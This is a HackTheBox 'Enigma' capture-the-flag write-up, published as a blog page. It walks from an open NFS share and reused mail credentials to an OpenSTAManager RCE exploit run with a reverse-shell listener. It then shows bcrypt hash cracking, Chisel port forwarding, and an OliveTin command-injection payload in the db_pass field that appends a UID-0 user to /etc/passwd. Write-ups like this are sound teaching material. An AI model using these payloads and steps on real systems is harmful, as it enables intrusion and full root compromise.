@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/my-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=my-blog/livereload" data-no-instant defer></script>
+  
+    <title>HackTheBox - Enigma Machine Writeup :: CTS Writeups</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introduction Welcome to my writeup for Enigma, a thrilling machine on HackTheBox. This writeup is for educational purposes only. In this walkthrough, we will cover the complete exploitation chain — starting from an open NFS share and email enumeration to gain initial access via an OpenSTAManager RCE (CVE-2026-38751). From there, we’ll perform local enumeration, crack database password hashes to pivot users, set up port forwarding with Chisel, and finally leverage a command injection vulnerability in OliveTin (CVE-2026-27626) to escalate privileges to root. Let’s dive in!
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/my-blog/posts/ilk-yazim/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/code.min.c4581949edab7810737609fc5568852bcd908945f14561e366dcd2300a370545.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/syntax.min.a2cc694a9b481f15d41722bffc2cc54eea4c4f74fd9072b0b33253604c22606e.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/my-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/my-blog/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/my-blog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HackTheBox - Enigma Machine Writeup">
+<meta property="og:description" content="Introduction Welcome to my writeup for Enigma, a thrilling machine on HackTheBox. This writeup is for educational purposes only. In this walkthrough, we will cover the complete exploitation chain — starting from an open NFS share and email enumeration to gain initial access via an OpenSTAManager RCE (CVE-2026-38751). From there, we’ll perform local enumeration, crack database password hashes to pivot users, set up port forwarding with Chisel, and finally leverage a command injection vulnerability in OliveTin (CVE-2026-27626) to escalate privileges to root. Let’s dive in!
+" />
+<meta property="og:url" content="http://localhost:1313/my-blog/posts/ilk-yazim/" />
+<meta property="og:site_name" content="CTS Writeups" />
+
+  <meta property="og:image" content="http://localhost:1313/my-blog/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-08-16 00:00:00 &#43;0400 &#43;04" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/my-blog/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/my-blog/posts/ilk-yazim/">HackTheBox - Enigma Machine Writeup</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-08-16</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Welcome to my writeup for <strong>Enigma</strong>, a thrilling machine on HackTheBox. This writeup is for educational purposes only. In this walkthrough, we will cover the complete exploitation chain — starting from an open NFS share and email enumeration to gain initial access via an OpenSTAManager RCE (<code>CVE-2026-38751</code>). From there, we’ll perform local enumeration, crack database password hashes to pivot users, set up port forwarding with Chisel, and finally leverage a command injection vulnerability in OliveTin (<code>CVE-2026-27626</code>) to escalate privileges to root. Let’s dive in!</p>
+<p>To begin the assessment, I started with a Nmap scan to identify open ports and services running on the target machine:</p>
+<pre tabindex="0"><code>PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+993/tcp   open  imaps
+995/tcp   open  pop3s
+2049/tcp  open  nfs
+43549/tcp open  unknown
+43787/tcp open  unknown
+53303/tcp open  unknown
+54343/tcp open  unknown
+57007/tcp open  unknown
+</code></pre><p>We notice that port 111 (NFS) is open from the Nmap scan.</p>
+<pre tabindex="0"><code>111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      37057/tcp   mountd
+|   100005  1,2,3      38991/udp   mountd
+|   100005  1,2,3      41651/tcp6  mountd
+|   100005  1,2,3      42376/udp6  mountd
+|   100021  1,3,4      32898/udp   nlockmgr
+|   100021  1,3,4      35958/udp6  nlockmgr
+|   100021  1,3,4      39815/tcp6  nlockmgr
+|   100021  1,3,4      43667/tcp   nlockmgr
+|   100024  1          41894/udp   status
+|   100024  1          42881/tcp6  status
+|   100024  1          45167/udp6  status
+|   100024  1          49327/udp   status
+|   100227  3           2049/tcp   nfs_acl
+|_  100227  3           2049/tcp6  nfs_acl
+</code></pre><p>After identifying that port 111 is open, I checked for shared directories using showmount.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount -e &lt;TARGET_IP&gt;
+</span></span></code></pre></div><p>The output revealed an exported directory: <strong>/srv/nfs/onboardin</strong>g. To inspect the contents of this share, I created a local directory and mounted the remote NFS share to my machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir nfs
+</span></span><span style="display:flex;"><span>sudo mount -t nfs &lt;TARGET_IP&gt;:/srv/nfs/onboarding nfs -o nolock
+</span></span></code></pre></div><p>Inside the mounted NFS directory, I explored the contents and found a PDF file containing credentials.
+<img src="/images/pdf.png" alt="PDF"></p>
+<p>After reviewing the credentials found in the PDF, I used them to access the web application or service hosted on the target.</p>
+<p>Since the target uses custom domains, I added both enigma.htb and mail001.enigma.htb to my /etc/hosts file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;TARGET_IP enigma.htb mail001.enigma.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>Using the credentials found in the PDF, I logged in as <strong>kevin</strong> at mail001.enigma.htb and found the following email:
+<img src="/images/kevin_mail.png" alt="Kevin Mail"></p>
+<p>From this email, I also discovered the existence of another user, <strong>sarah</strong>.</p>
+<p>Next, I tested Kevin&rsquo;s password against the newly discovered sarah user on <em><strong>mail001.enigma.htb</strong></em>, which resulted in a successful login And from Sarah&rsquo;s mailbox, we obtained new information:</p>
+<p><img src="/images/sarah_mail.png" alt="Sarah Mail"></p>
+<p>From the new email, I discovered a new domain. I added it to my /etc/hosts file to resolve it correctly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;TARGET_IP support_001.enigma.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>Using the acquired credentials (<strong>admin : Ne3s4rtars78s</strong>), I logged into support_001.enigma.htb and found an OpenSTAManager 2.9.8 instance.
+<img src="/images/OpenSTAManager.png" alt="OpenSTAManager"></p>
+<p>After further enumeration, I discovered that the application is running OpenSTAManager version 2.9.8. I then searched for existing exploits and found the following reference:
+<a href="https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751">CVE-2026-38751</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./openstamanager-rce-exploit -url http://support_001.enigma.htb -U admin -P Ne3s4rtars78s -lhost &lt;IP&gt; -lport <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>By running the exploit, I successfully achieved initial access on the target machine as the www-data user</p>
+<h3 id="lateral-movement-www-data---haris">Lateral Movement (www-data -&gt; haris)<a href="#lateral-movement-www-data---haris" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>To find other users on the system, I enumerated the configuration and log files, which led me to the database credentials stored in this file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /var/www/html/openstamanager/config.inc.php
+</span></span></code></pre></div><pre tabindex="0"><code>$db_host = &#39;localhost&#39;;
+$db_username = &#39;brollin&#39;;
+$db_password = &#39;Fri3nds@9099&#39;;
+$db_name = &#39;openstamanager&#39;;
+</code></pre><p>Using the credentials I extracted from the configuration file, I successfully logged into the MySQL database</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -h localhost -u brollin -p
+</span></span></code></pre></div><p>After authenticating with the password <strong>Fri3nds@9099</strong>, I gained access to the database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> databases;
+</span></span><span style="display:flex;"><span>use openstamanager;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> zz_users;
+</span></span></code></pre></div><p>By running queries inside the database, I retrieved the password hashes for the haris and admin users</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Plaintext" data-lang="Plaintext"><span style="display:flex;"><span>admin : $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
+</span></span><span style="display:flex;"><span>haris : $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
+</span></span></code></pre></div><p>After identifying the hash format, I cracked the hash for the harris user to obtain the plaintext password, while the admin hash could not be cracked:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC&#39;</span> &gt; hash.txt
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>bcrypt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+</span></span></code></pre></div><p>Result -&gt; haris : <strong>bestfriends</strong></p>
+<p>Using the cracked plaintext password, I switched to the <strong>harris</strong> user with the su command and successfully obtained the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>su haris
+</span></span></code></pre></div><h3 id="privilege-escalation-haris---root">Privilege Escalation (haris -&gt; root)<a href="#privilege-escalation-haris---root" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>While enumerating the system as the harris user, I discovered that a service called <strong>Olivetin</strong> is running on port 1337</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ss -tulnp | grep <span style="color:#ae81ff">1337</span> 
+</span></span></code></pre></div><p>To access the service running on port 1337 locally, I transferred Chisel to the target machine and set up port forwarding</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server -p <span style="color:#ae81ff">8000</span> - reverse <span style="color:#75715e">#on your host</span>
+</span></span><span style="display:flex;"><span>./chisel client &lt;YOUR_IP&gt;:8000 R:1337:127.0.0.1:1337 <span style="color:#75715e">#on TARGET host</span>
+</span></span></code></pre></div><p>By navigating to 127.0.0.1:1337 on my host machine, I saw that OliVetin version 3000.10.0 was running. After searching for known vulnerabilities related to this version, I found  <a href="https://github.com/advisories/GHSA-49gm-hh7w-wfvf">CVE-2026-27626</a></p>
+<h2 id="exploiting-cve-202627626">Exploiting CVE-2026–27626:<a href="#exploiting-cve-202627626" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>To leverage the vulnerability and gain root access, I decided to create a new user with root privileges (UID 0) directly on the system.</p>
+<p>Step 1: Generate a Password Hash
+First, I generated an MD5-crypt password hash for a new user. I chose the plaintext password <strong>12345</strong> and used xyz as the salt value with openssl:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl passwd -1 -salt xyz <span style="color:#ae81ff">12345</span> 
+</span></span></code></pre></div><p>This command generated the following hash:
+<code>$1$xyz$BsyKyb1qET4YoYqZL2pe./</code></p>
+<p>Step 2: Create Payload
+Next, I appended a new user entry named hacker directly into the /etc/passwd file. By setting the User ID (UID) and Group ID (GID) to 0, this user inherits full administrative (root) privileges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;hacker:$1$xyz$BsyKyb1qET4YoYqZL2pe./:0:0:root:/root:/bin/bash&#39;</span> &gt;&gt; /etc/passwd 
+</span></span></code></pre></div><p>To exploit the input field, I intercepted the request and injected the command inside the <strong>db_pass</strong> parameter using the following JSON structure</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;bindingId&#34;</span>: <span style="color:#e6db74">&#34;backup_database&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;arguments&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;db_user&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;backup_svc&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;db_pass&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;&#39;; echo &#39;hacker:$1$xyz$BsyKyb1qET4YoYqZL2pe./:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd ; echo &#39;&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;db_name&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;production&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="burp-suite-requestoverview">Burp Suite Request Overview<a href="#burp-suite-requestoverview" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><img src="/images/BurpRequest.png" alt="BurpRequest"></p>
+<blockquote>
+<p>Alternative Approach (Optional): If you&rsquo;d like to experiment with different exploitation payloads, you can modify the command &gt;injected into the db_pass parameter. For instance, instead of adding a new root user to /etc/passwd, you could assign the SUID &gt;bit to /bin/bash or use any other preferred privilege escalation payload. This step is entirely optional and up to your &gt;preference.</p>
+</blockquote>
+<h3 id="final-step">Final Step:<a href="#final-step" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>After sending this request, the system executed the command, successfully adding the hacker account with root privileges (UID 0). I then switched to the new user and obtained root access:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su hacker 
+</span></span></code></pre></div><p><code>Password: 12345</code></p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/my-blog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
